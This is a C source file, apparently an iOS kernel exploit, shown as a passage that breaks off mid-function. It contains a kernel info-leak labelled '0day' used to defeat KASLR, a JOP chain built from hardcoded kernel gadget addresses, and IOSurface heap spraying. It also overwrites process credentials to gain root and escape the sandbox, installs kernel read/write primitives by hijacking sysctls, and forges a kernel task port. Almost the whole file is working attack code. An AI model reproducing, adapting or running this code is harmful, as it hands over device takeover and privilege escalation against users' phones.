//
//  ALOA_exp.c
//  UHAK_final
//
//  Created by aa on 5/26/19.
//  Copyright © 2019 aa. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/semaphore.h>
#include <mach/mach_traps.h>
#include <pthread/pthread.h>
#include <IOSurface/IOSurfaceRef.h>
#include "IOKitLib.h"
#include "kernel_stru.h"
#include <sys/time.h>

#define printf(X,X2...) {}
#define printf_wow(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
#define print_line(X) {extern void log_toView(const char *input_cstr);log_toView(X);}

#pragma mark - Kernel Exploitation - Expose Previous Definitions

extern void Reply_notify_completion(void);
extern void Map_file_intoMem(void);
extern mach_vm_address_t mapEnd;
extern int cow_fd;
extern uint32_t cowmemlen;
extern char *Get_tempfile1_path(void);
extern void Send_overwritting_iosurfaceMap(uint64_t our_data_addr, uint64_t our_data_len, uint64_t remote_map_addr);
extern void Send_exit_msg(void);

extern void print_hexdump(void *buf, size_t len);

pthread_attr_t pth_commAttr = {0};
void pth_commAttr_init(){
    pthread_attr_init(&pth_commAttr);
    pthread_attr_setdetachstate(&pth_commAttr, PTHREAD_CREATE_DETACHED);
}

#define OF(offset) (offset)/sizeof(uint64_t)

#pragma mark - Kernel Exploitation - Global Variables

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

int proceed_to_post_exp = 0;

uint64_t JOP_ADDRESS = 0xffffffe12a500000;

uint64_t infoleak_addr = 0xfffffff0071f4110;

uint64_t kaslr = 0;

void *cowmem = NULL;
uint64_t KERNEL_BASE = 0xfffffff007004000;

semaphore_t exp_machsema = 0; // Use for block Kernel thread
char *override_sysctl_forRW = NULL;
char *override_sysctl_forSet = NULL;

char *ucred_get_root_also_unsandbox = NULL;
char our_original_cred[0x68];

struct semaphore *semaphore_stru_fromKernel = NULL;
uint64_t semaphore_ptr_fromKernel = 0;

uint64_t task_ptr_fromKernel = 0; // Our task stru kaddr
uint64_t proc_ptr_fromKernel = 0; // Our proc stru kaddr
uint64_t p_ucred_fromKernel = 0; // Our proc->p_ucred stru kaddr

// post-exploitation

uint64_t kernel_proc = 0;
uint64_t kernel_trustcache = 0;

uint64_t tmp_kernelHeap = 0;

#pragma mark - Kernel Exploitation - JOP Chain Calling

#define kjop_Start() \
jop_mem[OF(_jop_chainCalling_of)] = 0x0; /* Useless */ \
jop_mem[OF(_jop_chainCalling_of+0x8)] = jop_start_address + _jop_chainCalling_of+0xB8; /* Craft Obj 3 */ \
jop_mem[OF(_jop_chainCalling_of+0x10)] = jop_start_address + _jop_chainCalling_of+0x70; /* Craft Obj 2 */ \
jop_mem[OF(_jop_chainCalling_of+0x18)] = jop_start_address + _jop_chainCalling_of+0x28; /* Craft Obj 1 */ \
jop_mem[OF(_jop_chainCalling_of+0x20)] = 0x0; /* Useless */ \
_jop_link_of = (_jop_chainCalling_of+0x28)

#define kjop_Link() \
jop_mem[OF(_jop_link_of)] = jop_start_address + _jop_link_of; /* vtable */ \
jop_mem[OF(_jop_link_of+0x28)] = jop_hijack3_call; /* Link to another JOP Gadget */ \
_jop_chainCalling_of += 0xC0; \
jop_mem[OF(_jop_chainCalling_of)] = 0x0; /* Useless */ \
jop_mem[OF(_jop_chainCalling_of+0x8)] = jop_start_address + _jop_chainCalling_of+0xB8; /* Craft Obj 3 */ \
jop_mem[OF(_jop_chainCalling_of+0x10)] = jop_start_address + _jop_chainCalling_of+0x70; /* Craft Obj 2 */ \
jop_mem[OF(_jop_chainCalling_of+0x18)] = jop_start_address + _jop_chainCalling_of+0x28; /* Craft Obj 1 */ \
_jop_link_of = (_jop_chainCalling_of+0x28)

#define kjop_FuncCALL(FUNC, ARG1, ARG2, ARG3) \
jop_mem[OF(_jop_link_of)] = jop_start_address + _jop_link_of; /* vtable ptr */ \
jop_mem[OF(_jop_link_of+0x28)] = double_call; /* Dominate 2 args */ \
jop_mem[OF(_jop_link_of+0x10)] = jop_start_address+ _jop_link_of +0x20; \
jop_mem[OF(_jop_link_of+0x18)] = (uint64_t)(ARG3); \
jop_mem[OF(_jop_link_of+0x20)] = double_call; /* Upgrade to 3 args */ \
jop_mem[OF(_jop_link_of+0x30)] = (uint64_t)(ARG1); \
jop_mem[OF(_jop_link_of+0x38)] = (uint64_t)(ARG2); \
jop_mem[OF(_jop_link_of+0x40)] = (uint64_t)(FUNC); \
_jop_link_of += 0x48

#define kjop_FuncCALL_theEnd(FUNC, ARG1, ARG2, ARG3) \
kjop_FuncCALL(FUNC, ARG1, ARG2, ARG3)

/*
 Kernel JOP Modify arg in runtime
 
 ======== Case 1 //Update Next
 
 kjop_FuncCALL(kernel_memset, jop_start_address + _jop_link_of + ???, 0x22, 8);
 kjop_FuncCALL(TARGET_CALL, 0, 0, 0);
 
 ??? can be:
 | 0x88 : Update next call's Func
 | 0x78 : Update next call's X0
 | 0x80 : Update next call's X1
 | 0x60 : Update next call's X2
 
 ======== Case 2 //Update Next, with link in betw
 
 kjop_FuncCALL(kernel_memset, jop_start_address + _jop_link_of + ???, 0x22, 8);
 kjop_Link();
 kjop_FuncCALL(TARGET_CALL, 0, 0, 0);
 
 ??? can be:
 | 0xB8 : Update next call's Func
 | 0xA8 : Update next call's X0
 | 0xB0 : Update next call's X1
 | 0x90 : Update next call's X2
 
 ======== Case 3 // Ref to prev
 
 kjop_FuncCALL(ret_call, 0x111, 0x222, 0x333);
 kjop_FuncCALL(TARGET_CALL, jop_start_address + _jop_link_of - ???, 0, 0);
 
 ??? can be:
 |  : Update next call's Func
 | 0x18 : Update next call's X0
 |  : Update next call's X1
 |  : Update next call's X2
 
 */

#define pointTo_nextCall_FUNC jop_start_address + _jop_link_of + 0x88
#define pointTo_nextCall_ARG1 jop_start_address + _jop_link_of + 0x78
#define pointTo_nextCall_ARG2 jop_start_address + _jop_link_of + 0x80
#define pointTo_nextCall_ARG3 jop_start_address + _jop_link_of + 0x60

#define pointTo_nextCall_FUNC_acrLink jop_start_address + _jop_link_of + 0xB8
#define pointTo_nextCall_ARG1_acrLink jop_start_address + _jop_link_of + 0xA8
#define pointTo_nextCall_ARG2_acrLink jop_start_address + _jop_link_of + 0xB0
#define pointTo_nextCall_ARG3_acrLink jop_start_address + _jop_link_of + 0x90

#define pointTo_prevCall_FUNC jop_start_address + _jop_link_of - 0x8
#define pointTo_prevCall_ARG1 jop_start_address + _jop_link_of - 0x18
#define pointTo_prevCall_ARG2 jop_start_address + _jop_link_of - 0x10
#define pointTo_prevCall_ARG3 jop_start_address + _jop_link_of - 0x30

#define pointTo_prevCall_FUNC_acrLink jop_start_address + _jop_link_of - 0x38
#define pointTo_prevCall_ARG1_acrLink jop_start_address + _jop_link_of - 0x48
#define pointTo_prevCall_ARG2_acrLink jop_start_address + _jop_link_of - 0x40
#define pointTo_prevCall_ARG3_acrLink jop_start_address + _jop_link_of - 0x60

#define pointTo_prevCall2_ARG1_acrLink jop_start_address + _jop_link_of - 0x90

#pragma mark - Kernel Exploitation - Info Leak 0day

void IOConnectMapMemory_test_kaslr(io_connect_t ioconn){
    
    mach_vm_address_t map_addr = 0;
    mach_vm_size_t map_size = 0;
    
    kern_return_t kr;
    kr = IOConnectMapMemory64(ioconn, 0, mach_task_self(), &map_addr, &map_size, kIOMapAnywhere);
    if(kr){
        printf("Error: IOConnectMapMemory64(0x%x))\n", kr);
    }
    
    uint32_t search = 0xfffffff0; // Constant value of Kernel code segment higher 32bit addr
    uint64_t _tmpv = map_addr;
    size_t remainsize = map_size;
    while((_tmpv = (uint64_t)memmem((const void*)_tmpv, remainsize, &search, 4))){
        uint64_t tmpcalc = *(uint64_t*)(_tmpv - 4) - infoleak_addr;
        if( !(tmpcalc & 0xFFF) ){
            // kaslr offset always be 0x1000 aligned
            kaslr = tmpcalc;
            break;
        }
        
        _tmpv += 4;
        remainsize = ((uint64_t)map_addr + remainsize - _tmpv);
    }
}

mach_vm_offset_t Get_kaslr(io_connect_t ioconn){
    // Info Leak located in AppleSPUProfileDriverUserClient
    // open service in AppleSPUProfileDriver
    
    uint64_t input1 = 1;
    printf("getting kaslr\n");
    
    // Trying to allocating a new SharedDataQueue memory
    while(IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL)){
        input1 = 0;
        IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL); //Remove existing SharedDataQueue memory
        input1 = 1;
    }
    
    IOConnectMapMemory_test_kaslr(ioconn);
    printf("getting kaslr2\n");
    int i =0;
    while(!kaslr){
        IOConnectCallStructMethod(ioconn, 11, NULL, 0, NULL, NULL);
        IOConnectMapMemory_test_kaslr(ioconn);
        if(i == 5){
            i = 0;
            input1 = 0;
            IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL);
            input1 = 1;
            IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL);
        }
        i++;
    }
    printf("getting kaslr3\n");
    input1 = 0;
    IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL); //shutdown
    
    return kaslr;
}

#pragma mark - Kernel Exploitation - Construct Kernel JOP

void Assemble_Kernel_JOP5(uint64_t *jop_mem, uint64_t jop_start_address){
    /*
     JOP(5) -- perform kernel-level execution
     
     Initial hijacking point: 0xfffffff00690e8dc
     |  LDR             X0, [X19,#0x58] // x19 point to JOP memory
     |  LDR             X8, [X0]
     |  LDR             X8, [X8,#0x28]
     |  BLR             X8
     
     */
    
    uint64_t double_call = 0xFFFFFFF0075710D0 + kaslr;
    uint64_t jop_hijack3_call = 0xFFFFFFF0061B4448 + kaslr;
    uint64_t ret_call = 0xFFFFFFF00690E910 + kaslr;
    uint64_t kFunc_memset = 0xFFFFFFF0070D5740 + kaslr;
    uint64_t kernel_memmove = 0xFFFFFFF0070D5510 + kaslr;
    
    uint64_t kFunc_copyin = 0xFFFFFFF0071FC154 + kaslr;
    uint64_t kFunc_copyout = 0xFFFFFFF0071FC6C8 + kaslr;
    uint64_t kFunc_port_name_to_semaphore = 0xFFFFFFF00711765C + kaslr;
    uint64_t kFunc_semaphore_wait = 0xFFFFFFF007135744 + kaslr;
    uint64_t kFunc_semaphore_dereference = 0xFFFFFFF007134E88 + kaslr;
    
    uint64_t kSym_sysctl_l1icachesize_compat = 0xFFFFFFF007656D84 + kaslr; // For R/W
    uint64_t kSym_sysctl_l1dcachesize_compat = 0xFFFFFFF007656DD4 + kaslr; // For Set
    
    jop_mem[OF(0x20)] = 0; //Make safe return
    jop_mem[OF(0x28)] = 0; //Avoid obj-ref
    jop_mem[OF(0x58)] = 0; //Avoid obj-ref
    
    jop_mem[OF(0x30)] = jop_start_address + 0x50; // Craft obj *(obj + 0x28)(obj)
    jop_mem[OF(0x50)] = jop_start_address + 0x50; // Craft obj vtable ptr
    jop_mem[OF(0x78)] = double_call; // Initial hijacking point
    
    jop_mem[OF(0x60)] = jop_start_address + 0x80 - 0x8;
    jop_mem[OF(0x68)] = 0x111; //ARG2 (Unused)
    jop_mem[OF(0x70)] = jop_hijack3_call; // Start doing JOP
    
    uint32_t _jop_chainCalling_of = 0x80;
    uint32_t _jop_link_of = 0;
    
    // These willBe* value will be dynamically replaced when "Updating JOP Payload"
#define willBe_semaphore 0x1111111111111111
#define willBe_task_bsdinfo 0x2222222222222222
#define willBe_proc_p_ucred 0x3333333333333333
#define willBe_p_ucred_obtain_rootAndUnsandbox 0x4444444444444444
    
    kjop_Start();
    kjop_FuncCALL(kFunc_port_name_to_semaphore, exp_machsema, pointTo_nextCall_ARG1, 0);
    kjop_FuncCALL(kFunc_copyout, 0x414141, semaphore_stru_fromKernel, sizeof(*semaphore_stru_fromKernel)); //copyout semaphore stru
    kjop_Link();
    kjop_FuncCALL(kFunc_copyout, pointTo_prevCall_ARG1_acrLink, &semaphore_ptr_fromKernel, 0x8); //copyout semaphore ptr
    kjop_FuncCALL(kernel_memmove, pointTo_nextCall_ARG1_acrLink, pointTo_prevCall2_ARG1_acrLink, 0x8);
    kjop_Link();
    kjop_FuncCALL(kFunc_semaphore_wait, 0x414141, 0, 0);
    
    // Updating JOP Payload(1): Substitute all "semaphore" ptrs, grab our "task" ptr
    kjop_FuncCALL(kFunc_copyin, cowmem, JOP_ADDRESS + kaslr, 0x1000);
    kjop_Link();
    kjop_FuncCALL(kFunc_copyout, willBe_task_bsdinfo, &proc_ptr_fromKernel, 0x8);
    kjop_FuncCALL(kFunc_semaphore_wait, willBe_semaphore, 0, 0);
    kjop_Link();
    
    // Updating JOP Payload
    kjop_FuncCALL(kFunc_copyin, cowmem, JOP_ADDRESS + kaslr, 0x1000);
    kjop_FuncCALL(kFunc_copyout, willBe_proc_p_ucred, &p_ucred_fromKernel, 0x8);
    kjop_Link();
    kjop_FuncCALL(kFunc_semaphore_wait, willBe_semaphore, 0, 0);
    
    // Updating JOP Payload
    kjop_FuncCALL(kFunc_copyin, cowmem, JOP_ADDRESS + kaslr, 0x1000);
    kjop_Link();
    kjop_FuncCALL(kFunc_memset, JOP_ADDRESS + kaslr + 0x1000, 0, 0x20); // Replace a temporary "cr_label" to get outta sandbox
    kjop_FuncCALL(kernel_memmove, JOP_ADDRESS + kaslr + 0x1000 + 0x50, willBe_p_ucred_obtain_rootAndUnsandbox, 0x68); // Save original "cr_label" for patch it later
    kjop_Link();
    kjop_FuncCALL(kFunc_copyin, ucred_get_root_also_unsandbox, willBe_p_ucred_obtain_rootAndUnsandbox, 0x68); // Overwrite credentials
    kjop_FuncCALL(kFunc_copyin, override_sysctl_forRW, kSym_sysctl_l1icachesize_compat, 36); // Install r/w primitives
    kjop_Link();
    kjop_FuncCALL(kFunc_copyin, override_sysctl_forSet, kSym_sysctl_l1dcachesize_compat, 36);
    kjop_FuncCALL(kFunc_semaphore_wait, willBe_semaphore, 0, 0); //stay away from panic, waiting for repair stack data
    kjop_Link();
    kjop_FuncCALL(kFunc_semaphore_dereference, willBe_semaphore, 0, 0);
    kjop_FuncCALL(ret_call, 0, 0, 0); // <-- End of linking
    kjop_FuncCALL(ret_call, 0, 0, 0);
}

void Prepare_cow_file_wJOP_forKernel(){
    // Clean out what left from the last mapping
    mapEnd = 0;
    close(cow_fd);
    
    cowmem = calloc(1, cowmemlen);
    
    Assemble_Kernel_JOP5(cowmem, JOP_ADDRESS + kaslr);
    
    char *cow_fpath = Get_tempfile1_path();
    remove(cow_fpath);
    
    FILE *cow_fp = fopen(cow_fpath, "wb");
    fwrite(cowmem, 1, cowmemlen, cow_fp);
    fclose(cow_fp);
    // Don't free cowmem this time, as need it later for updating JOP
    
    cow_fd = open(cow_fpath, O_RDONLY);
}

void IOSurfaceRootUserClient_sRemoveValue(io_connect_t surfaceroot_ioconn, uint32_t spray_id){
    
    char input_stru[12];
    bzero(input_stru, sizeof(input_stru));
    *(uint32_t*)input_stru = spray_id;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    IOConnectCallStructMethod(surfaceroot_ioconn, 11, input_stru, sizeof(input_stru), &output_stru, &output_stru_size);
}

void Send_spray_mem_toKernel(io_connect_t surfaceroot_ioconn, uint32_t spray_id){
    printf("start kernel_spray_test\n");
    
    Prepare_cow_file_wJOP_forKernel();
    Map_file_intoMem();
    
    uint64_t first_spray_addr = 0x29f000000;
    uint64_t last_spray_addr = 0x29FFFC000; //cur: 0x30000 max: 0x29FFFC000;
    uint64_t spray_data_len = last_spray_addr - first_spray_addr - cowmemlen;
    uint32_t cnt = 0x70;
    
    printf("spray_data_len: 0x%x total: 0x%x\n", spray_data_len, spray_data_len * cnt);
    
    munmap(first_spray_addr, cowmemlen);
    munmap(last_spray_addr, cowmemlen);
    vm_allocate(mach_task_self(), &first_spray_addr, 0x4000, VM_FLAGS_FIXED);
    vm_allocate(mach_task_self(), &last_spray_addr, 0x4000, VM_FLAGS_FIXED);
    
    uint32_t *seria_data = (char*)(first_spray_addr + cowmemlen - 20);
    seria_data[0] = spray_id;
    seria_data[1] = 0;
    seria_data[2] = kOSSerializeMagic;
    seria_data[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    seria_data[4] = kOSSerializeData | spray_data_len;
    
    uint32_t *seria_data_end = last_spray_addr;
    seria_data_end[0] = kOSSerializeEndCollection | kOSSerializeString | 1;
    seria_data_end[1] = 0x1;
    
    uint64_t seria_data_len = spray_data_len + 20 + 8;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // 0xff8000 x 60 = 0x3BE20000
    
    for(int i=1;i<0x50;i++){
        seria_data_end[1] = i;
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(surfaceroot_ioconn, 9, seria_data, seria_data_len, &output_stru, &output_stru_size);
    }
    
    close(cow_fd);
}

#pragma mark - Kernel Exploitation - Kernel utilities

uint32_t KernelRead_4bytes(uint64_t rAddr){
    size_t rwSize = 0x4; // Specify r/w length
    uint64_t upload_addrNsize[2];
    upload_addrNsize[0] = rAddr; // Specify r/w addr
    upload_addrNsize[1] = rwSize;
    sysctlbyname("hw.l1dcachesize_compat", 0, 0, upload_addrNsize, sizeof(upload_addrNsize));
    uint32_t retdata = 0;
    sysctlbyname("hw.l1icachesize_compat", &retdata, &rwSize, 0, 0);
    return retdata;
}

uint64_t KernelRead_8bytes(uint64_t rAddr){
    size_t rwSize = 0x8; // Specify r/w length
    uint64_t upload_addrNsize[2];
    upload_addrNsize[0] = rAddr; // Specify r/w addr
    upload_addrNsize[1] = rwSize;
    sysctlbyname("hw.l1dcachesize_compat", 0, 0, upload_addrNsize, sizeof(upload_addrNsize));
    uint64_t retdata = 0;
    sysctlbyname("hw.l1icachesize_compat", &retdata, &rwSize, 0, 0);
    return retdata;
}

void KernelRead_anySize(uint64_t rAddr, char *outbuf, size_t outbuf_len){
    size_t rwSize = outbuf_len; // Specify r/w length
    uint64_t upload_addrNsize[2];
    upload_addrNsize[0] = rAddr; // Specify r/w addr
    upload_addrNsize[1] = rwSize;
    sysctlbyname("hw.l1dcachesize_compat", 0, 0, upload_addrNsize, sizeof(upload_addrNsize));
    sysctlbyname("hw.l1icachesize_compat", outbuf, &rwSize, 0, 0);
}

void KernelWrite_4bytes(uint64_t wAddr, uint32_t wData){
    size_t rwSize = 0x4; // Specify r/w length
    uint64_t upload_addrNsize[2];
    upload_addrNsize[0] = wAddr; // Specify r/w addr
    upload_addrNsize[1] = rwSize;
    sysctlbyname("hw.l1dcachesize_compat", 0, 0, upload_addrNsize, sizeof(upload_addrNsize));
    sysctlbyname("hw.l1icachesize_compat", 0, 0, &wData, rwSize);
}

void KernelWrite_8bytes(uint64_t wAddr, uint64_t wData){
    size_t rwSize = 0x8; // Specify r/w length
    uint64_t upload_addrNsize[2];
    upload_addrNsize[0] = wAddr; // Specify r/w addr
    upload_addrNsize[1] = rwSize;
    sysctlbyname("hw.l1dcachesize_compat", 0, 0, upload_addrNsize, sizeof(upload_addrNsize));
    sysctlbyname("hw.l1icachesize_compat", 0, 0, &wData, rwSize);
}

void KernelWrite_anySize(uint64_t wAddr, char *inputbuf, size_t inputbuf_len){
    size_t rwSize = inputbuf_len; // Specify r/w length
    uint64_t upload_addrNsize[2];
    upload_addrNsize[0] = wAddr; // Specify r/w addr
    upload_addrNsize[1] = rwSize;
    sysctlbyname("hw.l1dcachesize_compat", 0, 0, upload_addrNsize, sizeof(upload_addrNsize));
    sysctlbyname("hw.l1icachesize_compat", 0, 0, inputbuf, rwSize);
}

uint64_t KernelAllocate(size_t len){
    
    uint64_t return_addr = 0;
    
    uint64_t kernel_task = KernelRead_8bytes(kernel_proc + KOFFSET(proc, task));
    
    uint64_t kernel_itk_sself = KernelRead_8bytes(kernel_task + KOFFSET(task, itk_sself));
    // Retrieve send port of kernel task itself
    
    /*
     Build TFP0
     
     User Space
     |  Holding port names which are 32bit integer numbers to manipulating object in kernel
     - - - - - - - -
     Kernel
     |  How kernel handle port names passed from User Space:
     |    Resolving port names into port structures (ipc_object_t)
     |    port structures are carrying the actual kernel object, one by each (ipc_object_t->kobject)
     
     TFP0 refers to retrieving port name that represents kernel task object to User Space.
     
     Kernel task is a global variable, existing kernel code prevent from resolving kernel task object, means can't use it even got it. Detect by comparing resolved kernel object to Kernel task.
     
     Here is how to bypass:
     
     Craft a fake kernel task structure simply by copy over the first 0x150 bytes of data
     0x150 is surely enough to cover task->map(In my device, it's + 0x20), this is the only structure member involved in Mach memory alloc/dealloc
     */
    char _movbuf[0x150];
    KernelRead_anySize(kernel_task, _movbuf, 0x150);
    KernelWrite_anySize(tmp_kernelHeap, _movbuf, 0x150);
    
    uint64_t _backupVal = KernelRead_8bytes(task_ptr_fromKernel + KOFFSET(task, itk_nself));
    KernelWrite_8bytes(kernel_itk_sself + KOFFSET(ipc_port, kobject), tmp_kernelHeap);
    KernelWrite_8bytes(task_ptr_fromKernel + KOFFSET(task, itk_nself), kernel_itk_sself); // Put in a place we can reach
    
    mach_port_t kernel_taskport = 0;
    task_get_special_port(mach_task_self(), TASK_NAME_PORT, &kernel_taskport);
    // So kernel_taskport is the TFP0
    
    // Use TFP0 to legally allocating kernel memory
    vm_allocate(kernel_taskport, (vm_address_t*)&return_addr, len, VM_FLAGS_ANYWHERE);
    
    // restore everything
    mach_port_deallocate(mach_task_self(), kernel_taskport);
    KernelWrite_8bytes(task_ptr_fromKernel + KOFFSET(task, itk_nself), _backupVal);
    KernelWrite_8bytes(kernel_itk_sself + KOFFSET(ipc_port, kobject), kernel_task);
    
    return return_addr;
}

vm_offset_t KernelUti_GenerateOffset(uint64_t src, uint64_t data_in_src){
    vm_offset_t returnVal = 0;
    while(1){
        uint64_t gg = KernelRead_8bytes(src);
        if(gg == data_in_src)
            return returnVal;
        returnVal += 4;
        src += 4;
    }
    return 0;
}

#pragma mark - Kernel Exploitation - Spray against SMAP

void jopmem_search_and_replace(uint64_t find, uint64_t replace) {
    
    uint64_t *ptr = cowmem;
    while((ptr = memmem(cowmem, 0x1000, &find, sizeof(find)))){
        *ptr = replace;
        ptr ++;
    }
}

uint64_t find_thread_in_kernel(uint64_t input_id){
    uint64_t next_thread = KernelRead_8bytes(task_ptr_fromKernel + 0x40); // queue of task->threads
    //uint64_t prev_thread = KernelRead_8bytes(task_ptr_fromKernel + 0x48); // queue of task->threads
    //uint64_t proc_set = KernelRead_8bytes(task_ptr_fromKernel + 0x50);
    
    do{
        uint64_t i_id = KernelRead_8bytes(next_thread + 0x3E8);
        //printf("iter: thread id: 0x%llx\n", i_id);
        if(i_id == 0)
            break;
        if(i_id == input_id)
            break;
    }while((next_thread = KernelRead_8bytes(next_thread + 0x360)));
    
    return next_thread;
}

void repair_stack(uint64_t exploiting_thread_id){
    
    printf("+++ repair cr_label +++ \n");
    
    KernelRead_anySize(JOP_ADDRESS + kaslr + 0x1000 + 0x50, our_original_cred, sizeof(our_original_cred));
    uint64_t original_cr_label = *(uint64_t*)(our_original_cred + 0x60);
    KernelWrite_8bytes(original_cr_label + 0x10, 0); // Clear the Sandbox policy slot
    KernelWrite_8bytes(p_ucred_fromKernel + 0x78, original_cr_label); // Put it back
    
    printf("+++ repair_stack +++ \n");
    
    uint64_t attack_thread = find_thread_in_kernel(exploiting_thread_id);
    
    //thread id needs be same as attack thread id
    uint64_t stack = KernelRead_8bytes(attack_thread + 0x450);
    printf("machine.kstackptr: 0x%llx\n", stack);
    
    stack -= 0xC00;
    void *stack_backtrace = calloc(1, 0xC00);
    KernelRead_anySize(stack, stack_backtrace, 0xC00);
    
    uint64_t fix_addr = 0xfffffff00690139c + kaslr;
    uint64_t *seek_ptr = memmem(stack_backtrace, 0xC00, &fix_addr, 0x8);
    uint64_t found_offset = (uint64_t)seek_ptr - (uint64_t)stack_backtrace;
    printf("found offset: 0x%llx\n", found_offset);
    if(!found_offset){
        printf("failed when looking for offset\n");
        return;
    }
    stack += found_offset;
    fix_addr += 0x4; //skip operator delete
    KernelWrite_8bytes(stack, fix_addr);
    
    // Release the last blocking status of the kernel thread
    // The Kernel JOP is fully ended here
    semaphore_signal(exp_machsema);
    semaphore_destroy(mach_thread_self(), exp_machsema);
}

size_t kread2(uint64_t where, void *p, size_t size)
{
    KernelRead_anySize(where, p, size);
    return size;
}

void Initial_post_exp(){
    
    // res from patchfinder
    uint64_t find_kernproc_res = 0xfffffff0076670d8;
    uint64_t find_trustcache =  0xfffffff0076b0d10;
    
    kernel_proc = find_kernproc_res + kaslr;
    if(!kernel_proc){
        // This is telling that patchfinder must to update
        printf("ERROR: kernel_proc not found!\n");
        sleep(2);
        return;
    }
    kernel_proc = KernelRead_8bytes(kernel_proc);
    
    kernel_trustcache = find_trustcache;
    
    printf("kernel_trustcache: 0x%llx\n", kernel_trustcache);
    
    if(!kernel_trustcache){
        printf("ERROR: kernel_trustcache not found!\n");
        sleep(2);
        return;
    }
    kernel_trustcache += kaslr;
    
    tmp_kernelHeap = JOP_ADDRESS + kaslr;
    tmp_kernelHeap = KernelAllocate(0x4000);
    printf("tmp_kernelHeap: 0x%llx\n", tmp_kernelHeap);
}

void pwn_assist_thread(uint64_t exploiting_thread_id){
    
    printf("+++ pwn_side_thread runnnig +++\n");
    while(!semaphore_ptr_fromKernel){}; // wait for copyout
    
    printf("semaphore_ptr_fromKernel: 0x%llx\n", semaphore_ptr_fromKernel);
    task_ptr_fromKernel = semaphore_stru_fromKernel->owner;
    printf("Our task: 0x%llx\n", task_ptr_fromKernel);
    
    jopmem_search_and_replace(willBe_semaphore, semaphore_ptr_fromKernel);
    jopmem_search_and_replace(willBe_task_bsdinfo, task_ptr_fromKernel +  KOFFSET(task, bsd_info));
    semaphore_signal(exp_machsema);
    
    while(!proc_ptr_fromKernel){}; // wait for copyout
    printf("Our proc: 0x%llx\n", proc_ptr_fromKernel);
    jopmem_search_and_replace(willBe_proc_p_ucred, proc_ptr_fromKernel + KOFFSET(proc, p_ucred));
    semaphore_signal(exp_machsema);
    
    while(!p_ucred_fromKernel){}; // wait for copyout
    printf("proc->p_ucred: 0x%llx\n", p_ucred_fromKernel);
    jopmem_search_and_replace(willBe_p_ucred_obtain_rootAndUnsandbox, p_ucred_fromKernel + 0x18); //Overwriting cred in range of 0x18 ~ 0x80
    semaphore_signal(exp_machsema);
    
    while(getuid()){}; // Wait for kernel
    
    
    // Auto calc KOFFSET(proc, task)
    KOFFSET(proc, task) = KernelUti_GenerateOffset(proc_ptr_fromKernel, task_ptr_fromKernel);
    KOFFSET(task, itk_nself) = KOFFSET(task, itk_self) + 0x8;
    KOFFSET(task, itk_sself) = KOFFSET(task, itk_self) + 0x10;
    
    repair_stack(exploiting_thread_id);
    
    Initial_post_exp();
    
    proceed_to_post_exp = 1;
}

#pragma mark - Kernel Exploitation - Spray against SMAP

uint32_t IOSurfaceRootUserClient_create_surface(io_connect_t ioconn, uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x30000, //Need be least greater than 0x25b00 ref: AVE ERROR: IOSurfaceBufferInitInfo->Size() bad (48 - 154368)
        0x0,
    };
    
    size_t output_stru_size = 0xDD0; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        //uint64_t ret_addr2 = *(uint64_t*)(output_stru + 8); // Read-only mapping from kernel
        //uint64_t ret_addr3 = *(uint64_t*)(output_stru + 0x10); // Read-only mapping from kernel
        
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

uint64_t thread_getId(thread_t th){
    struct thread_identifier_info th_info;
    mach_msg_type_number_t th_info_outCnt = THREAD_IDENTIFIER_INFO_COUNT;
    
    if(!thread_info(th, THREAD_IDENTIFIER_INFO, (thread_info_t)&th_info, &th_info_outCnt))
        return th_info.thread_id;
    return 0;
}

void AppleAVE2UserClient_sPrepareToEncodeFrame(io_connect_t ioconn, io_connect_t surface_ioconn){
    
    {
        size_t input_stru_size = 0x8;
        char *input_stru = calloc(1, input_stru_size);
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(ioconn, 0, input_stru, input_stru_size, output_stru, &output_stru_size);
        // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
    }
    
    uint64_t surface1_map_addr = 0, surface1_map_size = 0;
    uint32_t iosurface_1 = IOSurfaceRootUserClient_create_surface(surface_ioconn, &surface1_map_addr, (uint32_t*)&surface1_map_size);
    
    // Spray memory contain JOP code
    Send_spray_mem_toKernel(surface_ioconn, iosurface_1);
    
    char *clientbuf = malloc(surface1_map_size);
    bzero(clientbuf, surface1_map_size);

